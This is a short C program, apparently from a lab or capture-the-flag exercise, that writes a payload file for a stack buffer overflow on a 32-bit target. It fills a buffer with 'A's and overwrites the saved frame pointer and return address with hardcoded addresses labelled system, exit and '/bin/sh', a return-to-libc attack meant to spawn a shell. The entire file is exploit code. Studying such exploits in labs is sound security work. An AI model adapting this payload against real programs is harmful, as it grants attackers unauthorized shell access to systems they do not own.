#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main (int argc, char** argv){
    int size = 80;
    char buf[size];
    FILE * el = fopen("./el", "w");
    memset(buf, 'A', size);

    // *(long *) &buf[48] = 0x0804e470; // ebp
    *(long *) &buf[60] = 0xffffce78; // ebp
    *(long *) &buf[64] = 0x0804ef70; // system
    *(long *) &buf[68] = 0xffffd1bd; // exit// stay same
    // *(long *) &buf[72] = 0x0804e470; // exit
    *(long *) &buf[72] = 0x080bb768; // /bin/sh
    *(long *) &buf[76] = 0x0804e470; // exit



    fwrite(buf, size, 1, el);
    fclose(el);

}